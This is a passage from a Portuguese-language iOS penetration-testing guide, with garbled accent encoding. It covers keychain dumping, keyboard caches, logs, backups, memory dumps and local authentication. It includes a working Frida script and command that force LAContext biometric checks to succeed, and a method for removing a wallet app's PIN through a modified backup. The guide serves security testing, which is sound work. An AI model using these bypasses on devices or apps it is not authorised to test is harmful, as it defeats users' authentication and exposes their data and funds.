myBanner.frame = UIScreen.main.bounds
backgroundImage = myBanner
window?.addSubview(myBanner)
}

func applicationWillEnterForeground(_ application: UIApplication) {
backgroundImage?.removeFromSuperview()
}
```
Objetivo-C:
```
@property (UIImageView *)backgroundImage;

- (void)applicationDidEnterBackground:(UIApplication *)application {
UIImageView *myBanner = [[UIImageView alloc] initWithImage:@"overlayImage.png"];
self.backgroundImage = myBanner;
self.backgroundImage.bounds = UIScreen.mainScreen.bounds;
[self.window addSubview:myBanner];
}

- (void)applicationWillEnterForeground:(UIApplication *)application {
[self.backgroundImage removeFromSuperview];
}
```
Isso define a imagem de fundo para `overlayImage.png` sempre que o aplicativo √© minimizado. Isso impede vazamentos de dados sens√≠veis porque `overlayImage.png` sempre substituir√° a visualiza√ß√£o atual.

### Keychain

Ferramentas como [**Keychain-Dumper**](https://github.com/ptoomey3/Keychain-Dumper) podem ser usadas para extrair o keychain (o dispositivo deve estar com jailbreak).\
Voc√™ tamb√©m pode usar `ios keychain dump` de [**Objection**](https://github.com/sensepost/objection)**.**

**NSURLCredential**

**NSURLCredential** √© a classe perfeita para **armazenar nome de usu√°rio e senha no keychain**. N√£o √© necess√°rio se preocupar com NSUserDefaults nem com nenhum wrapper de keychain.\
Uma vez que o usu√°rio est√° logado, voc√™ pode armazenar seu nome de usu√°rio e senha no keychain:
```swift
NSURLCredential *credential;

credential = [NSURLCredential credentialWithUser:username password:password persistence:NSURLCredentialPersistencePermanent];
[[NSURLCredentialStorage sharedCredentialStorage] setCredential:credential forProtectionSpace:self.loginProtectionSpace];
```
Voc√™ pode usar o `ios nsurlcredentialstorage dump` do **Objection** para despejar esses segredos.

## Teclados Personalizados/Cache do Teclado

A partir do iOS 8.0, a Apple permite instalar extens√µes personalizadas para iOS, como teclados personalizados.\
Os teclados instalados podem ser gerenciados via **Configura√ß√µes** > **Geral** > **Teclado** > **Teclados**\
Teclados personalizados podem ser usados para **farejar** as **teclas digitadas** e envi√°-las para o servidor do atacante. No entanto, observe que **teclados personalizados que requerem conectividade de rede ser√£o notificados ao usu√°rio.**\
Al√©m disso, o **usu√°rio pode alternar para um teclado diferente** (mais confi√°vel) **para introduzir as credenciais.**

Al√©m disso, **aplicativos podem impedir que seus usu√°rios usem teclados personalizados** dentro do app (ou pelo menos para partes sens√≠veis do app).

{% hint style="warning" %}
√â recomendado n√£o permitir teclados de terceiros se voc√™ considerar que os usu√°rios n√£o precisar√£o deles.
{% endhint %}

Observe que, por causa da autocorre√ß√£o e sugest√µes autom√°ticas, o teclado padr√£o do iOS capturar√° e armazenar√° cada palavra n√£o padr√£o em um arquivo de cache se o atributo **secureTextEntry** n√£o estiver definido como **true** ou se **autoCorrectionType** n√£o estiver definido como **UITextAutoCorrectionTypeNo.**

Por padr√£o, os teclados **armazenam esse cache** dentro do sandbox dos aplicativos no arquivo `Library/Keyboard/{locale}-dynamic-text.dat` ou em `/private/var/mobile/Library/Keyboard/dynamic-text.dat`. No entanto, ele pode estar salvando os dados em outro lugar.\
√â poss√≠vel redefinir o cache em _**Configura√ß√µes**_ > _**Geral**_ > _**Redefinir**_ > _**Redefinir Dicion√°rio do Teclado**_

{% hint style="info" %}
Portanto, **verifique sempre esses arquivos** e procure por poss√≠veis **informa√ß√µes sens√≠veis**.\
**Interceptar o tr√°fego de rede** √© outra maneira de verificar se o teclado personalizado est√° enviando teclas digitadas para um servidor remoto.
{% endhint %}

O [protocolo UITextInputTraits](https://developer.apple.com/reference/uikit/uitextinputtraits) √© usado para o cache do teclado. As classes UITextField, UITextView e UISearchBar suportam automaticamente este protocolo e oferecem as seguintes propriedades:

* `var autocorrectionType: UITextAutocorrectionType` determina se a autocorre√ß√£o est√° ativada durante a digita√ß√£o. Quando a autocorre√ß√£o est√° ativada, o objeto de texto rastreia palavras desconhecidas e sugere substitui√ß√µes adequadas, substituindo o texto digitado automaticamente, a menos que o usu√°rio anule a substitui√ß√£o. O valor padr√£o desta propriedade √© `UITextAutocorrectionTypeDefault`, que para a maioria dos m√©todos de entrada ativa a autocorre√ß√£o.
* `var secureTextEntry: BOOL` determina se a c√≥pia de texto e o cache de texto s√£o desativados e oculta o texto que est√° sendo inserido para `UITextField`. O valor padr√£o desta propriedade √© `NO`.

**Para identificar esse comportamento no c√≥digo:**

* Procure no c√≥digo-fonte por implementa√ß√µes semelhantes, como
```objectivec
textObject.autocorrectionType = UITextAutocorrectionTypeNo;
textObject.secureTextEntry = YES;
```
* Abra arquivos xib e storyboard no `Interface Builder` do Xcode e verifique os estados de `Secure Text Entry` e `Correction` no `Attributes Inspector` para o objeto apropriado.

O aplicativo deve impedir o armazenamento em cache de informa√ß√µes sens√≠veis inseridas em campos de texto. Voc√™ pode evitar o armazenamento em cache desativando-o programaticamente, usando a diretiva `textObject.autocorrectionType = UITextAutocorrectionTypeNo` nos UITextFields, UITextViews e UISearchBars desejados. Para dados que devem ser mascarados, como PINs e senhas, defina `textObject.secureTextEntry` para `YES`.
```objectivec
UITextField *textField = [ [ UITextField alloc ] initWithFrame: frame ];
textField.autocorrectionType = UITextAutocorrectionTypeNo;
```
## **Logs**

As formas mais comuns de depurar c√≥digo s√£o usando logs, e a aplica√ß√£o **pode imprimir informa√ß√µes sens√≠veis dentro dos logs**.\
Nas vers√µes do iOS 6 e anteriores, os logs eram leg√≠veis por todos (um aplicativo malicioso poderia ler logs de outros aplicativos e extrair informa√ß√µes sens√≠veis de l√°). **Atualmente, aplicativos s√≥ podem acessar seus pr√≥prios logs**.

No entanto, um **atacante** com **acesso f√≠sico** a um dispositivo **desbloqueado** pode conect√°-lo a um computador e **ler os logs** (note que os logs escritos no disco por um aplicativo n√£o s√£o removidos se o aplicativo for desinstalado).

√â recomendado **navegar por todas as telas** do aplicativo e **interagir** com **cada** elemento da UI e **funcionalidade** e fornecer texto de entrada em todos os campos de texto e **revisar os logs** em busca de **informa√ß√µes sens√≠veis** expostas.

Use as seguintes palavras-chave para verificar o c√≥digo-fonte do aplicativo em busca de declara√ß√µes de log predefinidas e personalizadas:

* Para fun√ß√µes predefinidas e integradas:
* NSLog
* NSAssert
* NSCAssert
* fprintf
* Para fun√ß√µes personalizadas:
* Logging
* Logfile

**Monitorando Logs do Sistema**

Muitos aplicativos registram mensagens informativas (e potencialmente sens√≠veis) no log do console. O log tamb√©m cont√©m relat√≥rios de falhas e outras informa√ß√µes √∫teis.

Voc√™ pode usar estas ferramentas:
```bash
idevice_id --list   # To find the device ID
idevicesyslog -u <id> (| grep <app>)   # To get the device logs
```
Voc√™ pode coletar logs do console atrav√©s da janela **Devices** do Xcode da seguinte forma:

1. Inicie o Xcode.
2. Conecte seu dispositivo ao computador host.
3. Escolha **Window** -> **Devices and Simulators**.
4. Clique no seu dispositivo iOS conectado na se√ß√£o esquerda da janela Devices.
5. Reproduza o problema.
6. Clique no bot√£o **Open Console** localizado na √°rea superior direita da janela Devices para visualizar os logs do console em uma janela separada.

![](<../../.gitbook/assets/image (466) (2) (2) (2) (2) (2) (2) (2) (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (15).png>)

Voc√™ tamb√©m pode se conectar ao shell do dispositivo conforme explicado em Accessing the Device Shell, instalar **socat** via **apt-get** e executar o seguinte comando:
```bash
iPhone:~ root# socat - UNIX-CONNECT:/var/run/lockdown/syslog.sock

========================
ASL is here to serve you
> watch
OK

Jun  7 13:42:14 iPhone chmod[9705] <Notice>: MS:Notice: Injecting: (null) [chmod] (1556.00)
Jun  7 13:42:14 iPhone readlink[9706] <Notice>: MS:Notice: Injecting: (null) [readlink] (1556.00)
Jun  7 13:42:14 iPhone rm[9707] <Notice>: MS:Notice: Injecting: (null) [rm] (1556.00)
Jun  7 13:42:14 iPhone touch[9708] <Notice>: MS:Notice: Injecting: (null) [touch] (1556.00)
...
```
```markdown
## Backups

O iOS inclui recursos de backup autom√°tico que criam c√≥pias dos dados armazenados no dispositivo. Voc√™ pode **fazer backups do iOS** a partir do seu computador host usando o iTunes (at√© o macOS Catalina) ou o Finder (a partir do macOS Catalina), ou atrav√©s do recurso de backup do iCloud. Em ambos os casos, o backup inclui quase todos os dados armazenados no dispositivo iOS, exceto dados altamente sens√≠veis, como informa√ß√µes do Apple Pay e configura√ß√µes do Touch ID.

Como o iOS faz backup de aplicativos instalados e seus dados, uma preocupa√ß√£o √≥bvia √© se **dados sens√≠veis do usu√°rio** armazenados pelo aplicativo podem **vazar involuntariamente atrav√©s do backup**. Outra preocupa√ß√£o, embora menos √≥bvia, √© se **configura√ß√µes de configura√ß√£o sens√≠veis usadas para proteger dados ou restringir a funcionalidade do aplicativo podem ser adulteradas para alterar o comportamento do aplicativo ap√≥s restaurar um backup modificado**. Ambas as preocupa√ß√µes s√£o v√°lidas e essas vulnerabilidades provaram existir em um grande n√∫mero de aplicativos hoje.

Um backup de um dispositivo no qual um aplicativo m√≥vel foi instalado incluir√° todos os subdiret√≥rios (exceto `Library/Caches/`) e arquivos no [diret√≥rio privado do aplicativo](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW12).\
Portanto, **evite armazenar dados sens√≠veis em texto simples dentro de qualquer um dos arquivos ou pastas que est√£o no diret√≥rio privado do aplicativo ou subdiret√≥rios**.

Embora todos os arquivos em `Documents/` e `Library/Application Support/` sejam sempre feitos backup por padr√£o, voc√™ pode [excluir arquivos do backup](https://developer.apple.com/library/content/documentation/FileManagement/Conceptual/FileSystemProgrammingGuide/FileSystemOverview/FileSystemOverview.html#//apple_ref/doc/uid/TP40010672-CH2-SW28) chamando `NSURL setResourceValue:forKey:error:` com a chave `NSURLIsExcludedFromBackupKey`.\
Voc√™ pode usar as propriedades do sistema de arquivos [NSURLIsExcludedFromBackupKey](https://developer.apple.com/reference/foundation/nsurl#//apple_ref/c/data/NSURLIsExcludedFromBackupKey) e [CFURLIsExcludedFromBackupKey](https://developer.apple.com/reference/corefoundation/cfurl-rd7#//apple_ref/c/data/kCFURLIsExcludedFromBackupKey) para excluir arquivos e diret√≥rios dos backups.

{% hint style="warning" %}
Portanto, ao verificar o backup de um aplicativo, voc√™ deve verificar se **alguma informa√ß√£o sens√≠vel** √© acess√≠vel e se voc√™ pode **modificar algum comportamento sens√≠vel** do aplicativo **modificando alguma configura√ß√£o do backup** e restaurando o backup.
{% endhint %}

**Como testar**

Comece **criando um backup do dispositivo** (voc√™ pode fazer isso usando o Finder) e descobrindo onde o backup est√° armazenado. A documenta√ß√£o oficial da Apple ajudar√° voc√™ a [localizar backups do seu iPhone, iPad e iPod touch](https://support.apple.com/en-us/HT204215).

Uma vez que voc√™ encontrou o backup do dispositivo (`/Users/carlos.martin/Library/Application Support/MobileSync/Backup/{deviceID}`), voc√™ pode come√ßar a procurar por informa√ß√µes sens√≠veis usando, por exemplo, grep, ou usando ferramentas como [iMazing](https://imazing.com)).

Para identificar se um backup est√° criptografado, voc√™ pode verificar a chave chamada "IsEncrypted" do arquivo "Manifest.plist", localizado na raiz do diret√≥rio de backup. O exemplo a seguir mostra uma configura√ß√£o indicando que o backup est√° criptografado:
```
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
...
<key>Date</key>
<date>2021-03-12T17:43:33Z</date>
<key>IsEncrypted</key>
<true/>
...
</plist>
```
Caso voc√™ precise trabalhar com um backup criptografado, existem alguns scripts Python no [reposit√≥rio GitHub da DinoSec](https://github.com/dinosec/iphone-dataprotection/tree/master/python_scripts), como **backup_tool.py** e **backup_passwd.py**, que servir√£o como um bom ponto de partida. No entanto, observe que eles podem n√£o funcionar com as √∫ltimas vers√µes do iTunes/Finder e podem precisar de ajustes.

Voc√™ tamb√©m pode usar a ferramenta [**iOSbackup**](https://pypi.org/project/iOSbackup/) para ler e extrair arquivos de um backup iOS criptografado por senha com facilidade.

**Como modificar o comportamento**

No aplicativo de carteira de bitcoin de c√≥digo aberto, [Bither](https://github.com/bither/bither-ios), voc√™ ver√° que √© poss√≠vel configurar um PIN para bloquear a UI.\
Esse PIN √© armazenado no arquivo `net.bither.plist` dentro da **chave pin_code**.\
Se voc√™ limpar essa chave desse plist no backup e restaurar o backup, voc√™ poder√° acessar a carteira.

## Testando Mem√≥ria para Dados Sens√≠veis

Em algum momento, informa√ß√µes sens√≠veis ser√£o armazenadas na mem√≥ria. O objetivo √© garantir que essas informa√ß√µes sejam expostas pelo menor tempo poss√≠vel.

Para investigar a mem√≥ria de um aplicativo, primeiro crie um **dump de mem√≥ria**. Alternativamente, voc√™ pode **analisar a mem√≥ria em tempo real** com, por exemplo, um depurador. Independentemente do m√©todo que voc√™ usar, esse √© um processo muito propenso a erros porque os dumps fornecem os dados deixados por fun√ß√µes executadas e voc√™ pode perder a execu√ß√£o de etapas cr√≠ticas. Al√©m disso, √© muito f√°cil negligenciar dados durante a an√°lise, a menos que voc√™ conhe√ßa a pegada dos dados que est√° procurando (seja seu valor exato ou seu formato). Por exemplo, se o aplicativo criptografa de acordo com uma chave sim√©trica gerada aleatoriamente, √© muito improv√°vel que voc√™ localize a chave na mem√≥ria, a menos que encontre seu valor por outros meios.

**Recuperando e Analisando um Dump de Mem√≥ria**

Seja voc√™ usando um dispositivo com jailbreak ou sem jailbreak, voc√™ pode despejar a mem√≥ria do processo do aplicativo com [objection](https://github.com/sensepost/objection) e [Fridump](https://github.com/Nightbringer21/fridump).

Ap√≥s a mem√≥ria ter sido despejada (por exemplo, para um arquivo chamado "memory"), dependendo da natureza dos dados que voc√™ est√° procurando, voc√™ precisar√° de um conjunto de ferramentas diferentes para processar e analisar esse dump de mem√≥ria. Por exemplo, se voc√™ estiver focando em strings, pode ser suficiente para voc√™ executar o comando `strings` ou `rabin2 -zz` para extrair essas strings.
```bash
# using strings
$ strings memory > strings.txt

# using rabin2
$ rabin2 -ZZ memory > strings.txt
```
Abra `strings.txt` no seu editor favorito e analise-o para identificar informa√ß√µes sens√≠veis.

No entanto, se voc√™ quiser inspecionar outros tipos de dados, √© melhor usar o radare2 e suas capacidades de busca. Consulte a ajuda do radare2 sobre o comando de busca (`/?`) para mais informa√ß√µes e uma lista de op√ß√µes. A seguir, apresenta-se apenas um subconjunto delas:
```bash
$ r2 <name_of_your_dump_file>

[0x00000000]> /?
Usage: /[!bf] [arg]  Search stuff (see 'e??search' for options)
|Use io.va for searching in non virtual addressing spaces
| / foo\x00                    search for string 'foo\0'
| /c[ar]                       search for crypto materials
| /e /E.F/i                    match regular expression
| /i foo                       search for string 'foo' ignoring case
| /m[?][ebm] magicfile         search for magic, filesystems or binary headers
| /v[1248] value               look for an `cfg.bigendian` 32bit value
| /w foo                       search for wide string 'f\0o\0o\0'
| /x ff0033                    search for hex string
| /z min max                   search for strings of given size
...
```
**An√°lise de Mem√≥ria em Tempo de Execu√ß√£o**

Ao usar [**r2frida**](https://github.com/nowsecure/r2frida), voc√™ pode analisar e inspecionar a mem√≥ria do aplicativo enquanto est√° em execu√ß√£o e sem a necessidade de despej√°-la. Por exemplo, voc√™ pode executar os comandos de busca anteriores do r2frida e procurar na mem√≥ria por uma string, valores hexadecimais, etc. Ao fazer isso, lembre-se de adicionar uma barra invertida `\` antes do comando de busca (e qualquer outro comando espec√≠fico do r2frida) ap√≥s iniciar a sess√£o com `r2 frida://usb//<nome_do_seu_app>`.

## Criptografia Quebrada

### Processos de Gerenciamento de Chaves Inadequados

Alguns desenvolvedores salvam dados sens√≠veis no armazenamento local e os criptografam com uma chave codificada/previs√≠vel no c√≥digo. Isso n√£o deve ser feito, pois algum processo de engenharia reversa poderia permitir que atacantes extra√≠ssem as informa√ß√µes confidenciais.

### Uso de Algoritmos Inseguros e/ou Obsoletos

Desenvolvedores n√£o devem usar **algoritmos obsoletos** para realizar **verifica√ß√µes** de autoriza√ß√£o, **armazenar** ou **enviar** dados. Alguns desses algoritmos s√£o: RC4, MD4, MD5, SHA1... Se **hashes** s√£o usados para armazenar senhas, por exemplo, devem ser usados hashes **resistentes** √† for√ßa bruta com sal.

### Verifica√ß√£o

As principais verifica√ß√µes a serem realizadas s√£o para descobrir se voc√™ pode encontrar senhas/segredos **codificados** no c√≥digo, ou se esses s√£o **previs√≠veis**, e se o c√≥digo est√° usando algum tipo de algoritmos de **criptografia** **fracos**.

√â interessante saber que voc√™ pode **monitorar** algumas **bibliotecas** de **cripto** automaticamente usando **objection** com:
```swift
ios monitor crypt
```
Para **mais informa√ß√µes** sobre APIs e bibliotecas criptogr√°ficas do iOS, acesse [https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography](https://mobile-security.gitbook.io/mobile-security-testing-guide/ios-testing-guide/0x06e-testing-cryptography)

## Autentica√ß√£o Local

O testador deve estar ciente de que **a autentica√ß√£o local deve sempre ser aplicada em um ponto final remoto** ou com base em um primitivo criptogr√°fico. Atacantes podem facilmente contornar a autentica√ß√£o local se nenhum dado retornar do processo de autentica√ß√£o.

O [**framework de Autentica√ß√£o Local**](https://developer.apple.com/documentation/localauthentication) fornece um conjunto de APIs para desenvolvedores estenderem um di√°logo de autentica√ß√£o ao usu√°rio. No contexto de conex√£o com um servi√ßo remoto, √© poss√≠vel (e recomendado) utilizar o [keychain](https://developer.apple.com/library/content/documentation/Security/Conceptual/keychainServConcepts/01introduction/introduction.html) para implementar autentica√ß√£o local.

O sensor de **ID por impress√£o digital** √© operado pelo [coprocessador de seguran√ßa SecureEnclave](https://www.blackhat.com/docs/us-16/materials/us-16-Mandt-Demystifying-The-Secure-Enclave-Processor.pdf) e n√£o exp√µe dados da impress√£o digital a outras partes do sistema. Al√©m do Touch ID, a Apple introduziu o _Face ID_: que permite autentica√ß√£o baseada em reconhecimento facial.

Desenvolvedores t√™m duas op√ß√µes para incorporar autentica√ß√£o Touch ID/Face ID:

* `LocalAuthentication.framework` √© uma API de alto n√≠vel que pode ser usada para **autenticar o usu√°rio via Touch ID**. O aplicativo n√£o pode acessar dados associados √† impress√£o digital cadastrada e √© notificado apenas se a autentica√ß√£o foi bem-sucedida.
* `Security.framework` √© uma API de n√≠vel mais baixo para acessar [servi√ßos de keychain](https://developer.apple.com/documentation/security/keychain\_services). Esta √© uma op√ß√£o segura se seu aplicativo precisa **proteger alguns dados secretos com autentica√ß√£o biom√©trica**, j√° que o controle de acesso √© gerenciado em n√≠vel de sistema e n√£o pode ser facilmente contornado. `Security.framework` tem uma API em C, mas existem v√°rios [wrappers de c√≥digo aberto dispon√≠veis](https://www.raywenderlich.com/147308/secure-ios-user-data-keychain-touch-id), tornando o acesso ao keychain t√£o simples quanto ao NSUserDefaults.

{% hint style="danger" %}
Esteja ciente de que usar o `LocalAuthentication.framework` ou o `Security.framework` ser√° um controle que pode ser contornado por um atacante, pois retorna apenas um booleano e nenhum dado para prosseguir. Veja [Don't touch me that way, por David Lindner et al](https://www.youtube.com/watch?v=XhXIHVGCFFM) para mais detalhes.
{% endhint %}

### Framework de Autentica√ß√£o Local

Desenvolvedores podem exibir um **prompt de autentica√ß√£o** utilizando a fun√ß√£o **`evaluatePolicy`** da classe **`LAContext`**. Duas pol√≠ticas dispon√≠veis definem formas aceit√°veis de autentica√ß√£o:

* `deviceOwnerAuthentication`(Swift) ou `LAPolicyDeviceOwnerAuthentication`(Objective-C): Quando dispon√≠vel, o usu√°rio √© solicitado a realizar autentica√ß√£o Touch ID. Se o Touch ID n√£o estiver ativado, a senha do dispositivo √© solicitada em vez disso. Se a senha do dispositivo n√£o estiver habilitada, a avalia√ß√£o da pol√≠tica falha.
* `deviceOwnerAuthenticationWithBiometrics` (Swift) ou `LAPolicyDeviceOwnerAuthenticationWithBiometrics`(Objective-C): A autentica√ß√£o √© restrita a biometria onde o usu√°rio √© solicitado pelo Touch ID.

A fun√ß√£o **`evaluatePolicy` retorna um valor booleano** indicando se o usu√°rio foi autenticado com sucesso. O que significa que pode ser facilmente contornado (veja abaixo)

### Autentica√ß√£o Local usando Keychain

As **APIs do keychain do iOS podem (e devem) ser usadas para implementar autentica√ß√£o local**. Durante esse processo, o aplicativo armazena um token de autentica√ß√£o secreto ou outro peda√ßo de dado secreto identificando o usu√°rio no keychain. Para autenticar em um servi√ßo remoto, o usu√°rio deve desbloquear o keychain usando sua senha ou impress√£o digital para obter o dado secreto.

O keychain permite salvar itens com o atributo especial `SecAccessControl`, que permitir√° acesso ao item do keychain apenas ap√≥s o usu√°rio passar pela autentica√ß√£o Touch ID (ou senha, se tal op√ß√£o de fallback for permitida pelos par√¢metros do atributo).

No seguinte exemplo, salvaremos a string "test\_strong\_password" no keychain. A string pode ser acessada apenas no dispositivo atual enquanto a senha estiver configurada (`kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly` par√¢metro) e ap√≥s autentica√ß√£o Touch ID para os dedos atualmente cadastrados apenas (`SecAccessControlCreateFlags.biometryCurrentSet` par√¢metro):

{% tabs %}
{% tab title="Swift" %}
```swift
// 1. create AccessControl object that will represent authentication settings

var error: Unmanaged<CFError>?

guard let accessControl = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
SecAccessControlCreateFlags.biometryCurrentSet,
&error) else {
// failed to create AccessControl object

return
}

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute

var query: [String: Any] = [:]

query[kSecClass as String] = kSecClassGenericPassword
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecAttrAccount as String] = "OWASP Account" as CFString
query[kSecValueData as String] = "test_strong_password".data(using: .utf8)! as CFData
query[kSecAttrAccessControl as String] = accessControl

// 3. save item

let status = SecItemAdd(query as CFDictionary, nil)

if status == noErr {
// successfully saved
} else {
// error while saving
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. create AccessControl object that will represent authentication settings
CFErrorRef *err = nil;

SecAccessControlRef sacRef = SecAccessControlCreateWithFlags(kCFAllocatorDefault,
kSecAttrAccessibleWhenPasscodeSetThisDeviceOnly,
kSecAccessControlUserPresence,
err);

// 2. define keychain services query. Pay attention that kSecAttrAccessControl is mutually exclusive with kSecAttrAccessible attribute
NSDictionary* query = @{
(_ _bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecAttrAccount: @"OWASP Account",
(__bridge id)kSecValueData: [@"test_strong_password" dataUsingEncoding:NSUTF8StringEncoding],
(__bridge id)kSecAttrAccessControl: (__bridge_transfer id)sacRef
};

// 3. save item
OSStatus status = SecItemAdd((__bridge CFDictionaryRef)query, nil);

if (status == noErr) {
// successfully saved
} else {
// error while saving
}
```
```markdown
{% endtab %}
{% endtabs %}

Agora podemos solicitar o item salvo no keychain. Os servi√ßos do keychain apresentar√£o o di√°logo de autentica√ß√£o ao usu√°rio e retornar√£o dados ou nil, dependendo se uma impress√£o digital adequada foi fornecida ou n√£o.

{% tabs %}
{% tab title="Swift" %}
```
```swift
// 1. define query
var query = [String: Any]()
query[kSecClass as String] = kSecClassGenericPassword
query[kSecReturnData as String] = kCFBooleanTrue
query[kSecAttrAccount as String] = "My Name" as CFString
query[kSecAttrLabel as String] = "com.me.myapp.password" as CFString
query[kSecUseOperationPrompt as String] = "Please, pass authorisation to enter this area" as CFString

// 2. get item
var queryResult: AnyObject?
let status = withUnsafeMutablePointer(to: &queryResult) {
SecItemCopyMatching(query as CFDictionary, UnsafeMutablePointer($0))
}

if status == noErr {
let password = String(data: queryResult as! Data, encoding: .utf8)!
// successfully received password
} else {
// authorization not passed
}
```
{% endtab %}

{% tab title="Objective-C" %}
```objectivec
// 1. define query
NSDictionary *query = @{(__bridge id)kSecClass: (__bridge id)kSecClassGenericPassword,
(__bridge id)kSecReturnData: @YES,
(__bridge id)kSecAttrAccount: @"My Name1",
(__bridge id)kSecAttrLabel: @"com.me.myapp.password",
(__bridge id)kSecUseOperationPrompt: @"Please, pass authorisation to enter this area" };

// 2. get item
CFTypeRef queryResult = NULL;
OSStatus status = SecItemCopyMatching((__bridge CFDictionaryRef)query, &queryResult);

if (status == noErr){
NSData* resultData = ( __bridge_transfer NSData* )queryResult;
NSString* password = [[NSString alloc] initWithData:resultData encoding:NSUTF8StringEncoding];
NSLog(@"%@", password);
} else {
NSLog(@"Something went wrong");
}
```
{% endtab %}
{% endtabs %}

### Detec√ß√£o

A utiliza√ß√£o de frameworks em um aplicativo tamb√©m pode ser detectada analisando a lista de bibliotecas din√¢micas compartilhadas do bin√°rio do aplicativo. Isso pode ser feito usando `otool`:
```bash
$ otool -L <AppName>.app/<AppName>
```
Se `LocalAuthentication.framework` for usado em um aplicativo, a sa√≠da conter√° ambas as linhas a seguir (lembre-se de que `LocalAuthentication.framework` usa `Security.framework` por baixo dos panos):
```bash
/System/Library/Frameworks/LocalAuthentication.framework/LocalAuthentication
/System/Library/Frameworks/Security.framework/Security
```
### Contornando o Framework de Autentica√ß√£o Local

#### Objection

[**Objection Biometrics Bypass**](https://github.com/sensepost/objection/wiki/Understanding-the-iOS-Biometrics-Bypass) pode ser usado para contornar o LocalAuthentication. O Objection **utiliza o Frida para instrumentar a fun√ß√£o `evaluatePolicy` de forma que ela retorne `True`** mesmo que a autentica√ß√£o n√£o tenha sido realizada com sucesso. Use o comando `ios ui biometrics_bypass` para contornar a autentica√ß√£o biom√©trica insegura. O Objection registrar√° um trabalho, que substituir√° o resultado de `evaluatePolicy`. Funcionar√° tanto em implementa√ß√µes Swift quanto Objective-C.
```bash
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # ios ui biometrics_bypass
(agent) Registering job 3mhtws9x47q. Type: ios-biometrics-disable
...itudehacks.DVIAswiftv2.develop on (iPhone: 13.2.3) [usb] # (agent) [3mhtws9x47q] Localized Reason for auth requirement: Please authenticate yourself
(agent) [3mhtws9x47q] OS authentication response: false
(agent) [3mhtws9x47q] Marking OS response as True instead
(agent) [3mhtws9x47q] Biometrics bypass hook complete
```
Se vulner√°vel, o m√≥dulo ir√° automaticamente contornar o formul√°rio de login.

#### Frida

Um exemplo de uso de **`evaluatePolicy`** da [aplica√ß√£o DVIA-v2](https://github.com/prateek147/DVIA-v2):
```swift
+(void)authenticateWithTouchID {
LAContext *myContext = [[LAContext alloc] init];
NSError *authError = nil;
NSString *myLocalizedReasonString = @"Please authenticate yourself";

if ([myContext canEvaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics error:&authError]) {
[myContext evaluatePolicy:LAPolicyDeviceOwnerAuthenticationWithBiometrics
localizedReason:myLocalizedReasonString
reply:^(BOOL success, NSError *error) {
if (success) {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Successful" withTitle:@"Success"];
});
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Authentication Failed !" withTitle:@"Error"];
});
}
}];
} else {
dispatch_async(dispatch_get_main_queue(), ^{
[TouchIDAuthentication showAlert:@"Your device doesn't support Touch ID or you haven't configured Touch ID authentication on your device" withTitle:@"Error"];
});
}
}
```
Para burlar a Autentica√ß√£o Local, temos que escrever um script Frida que **bypasses** a verifica√ß√£o _**evaluatePolicy**_ mencionada anteriormente. Como voc√™ pode ver no trecho de c√≥digo acima colado, o **evaluatePolicy** usa um **callback** que determina o **result**. Portanto, a maneira mais f√°cil de realizar o hack √© interceptar esse callback e garantir que ele sempre retorne o_ **success=1**.
```swift
// from https://securitycafe.ro/2022/09/05/mobile-pentesting-101-bypassing-biometric-authentication/
if(ObjC.available) {
console.log("Injecting...");
var hook = ObjC.classes.LAContext["- evaluatePolicy:localizedReason:reply:"];
Interceptor.attach(hook.implementation, {
onEnter: function(args) {
var block = new ObjC.Block(args[4]);
const callback = block.implementation;
block.implementation = function (error, value)  {

console.log("Changing the result value to true")
const result = callback(1, null);
return result;
};
},
});
} else {
console.log("Objective-C Runtime is not available!");
}
```

```
frida -U -f com.highaltitudehacks.DVIAswiftv2 --no-pause -l fingerprint-bypass-ios.js
```
## Exposi√ß√£o de Funcionalidades Sens√≠veis Atrav√©s de IPC

### Manipuladores de URI Personalizados / Deeplinks / Esquemas Personalizados

{% content-ref url="ios-custom-uri-handlers-deeplinks-custom-schemes.md" %}
[ios-custom-uri-handlers-deeplinks-custom-schemes.md](ios-custom-uri-handlers-deeplinks-custom-schemes.md)
{% endcontent-ref %}

### Links Universais

{% content-ref url="ios-universal-links.md" %}
[ios-universal-links.md](ios-universal-links.md)
{% endcontent-ref %}

### Compartilhamento UIActivity

{% content-ref url="ios-uiactivity-sharing.md" %}
[ios-uiactivity-sharing.md](ios-uiactivity-sharing.md)
{% endcontent-ref %}

### UIPasteboard

{% content-ref url="ios-uipasteboard.md" %}
[ios-uipasteboard.md](ios-uipasteboard.md)
{% endcontent-ref %}

### Extens√µes de Aplicativos

{% content-ref url="ios-app-extensions.md" %}
[ios-app-extensions.md](ios-app-extensions.md)
{% endcontent-ref %}

### WebViews

{% content-ref url="ios-webviews.md" %}
[ios-webviews.md](ios-webviews.md)
{% endcontent-ref %}

### Serializa√ß√£o e Codifica√ß√£o

{% content-ref url="ios-serialisation-and-encoding.md" %}
[ios-serialisation-and-encoding.md](ios-serialisation-and-encoding.md)
{% endcontent-ref %}

## Comunica√ß√£o de Rede

